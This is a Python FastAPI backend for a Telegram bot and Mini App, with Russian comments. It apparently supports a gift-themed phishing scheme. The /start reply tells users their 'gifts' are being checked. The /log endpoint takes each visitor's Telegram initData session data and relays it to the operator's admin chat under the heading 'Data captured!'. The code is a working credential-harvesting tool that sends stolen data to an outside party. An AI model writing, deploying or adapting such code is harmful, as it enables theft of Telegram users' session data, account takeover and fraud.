from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import requests
import os

app = FastAPI()

# Разрешаем Mini App отправлять данные
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# --- НОВАЯ ЧАСТЬ ДЛЯ ОТВЕТА НА /START ---
def send_telegram_msg(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    })

@app.post("/webhook") # Этот эндпоинт нужен для обработки сообщений
async def webhook(request: Request):
    data = await request.json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            # Твой новый текст
            msg = "Проверка подарков...\nПодождите, это займет некоторое время"
            send_telegram_msg(chat_id, msg)
    return {"status": "ok"}
# ---------------------------------------

@app.post("/log")
async def log_data(request: Request):
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        msg = f"✅ **Данные захвачены!**\n\n`{init_data}`"
        send_telegram_msg(ADMIN_ID, msg)
        
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/")
async def root():
    return {"message": "Server is running!"}
    return {"message": "Server is running!"}
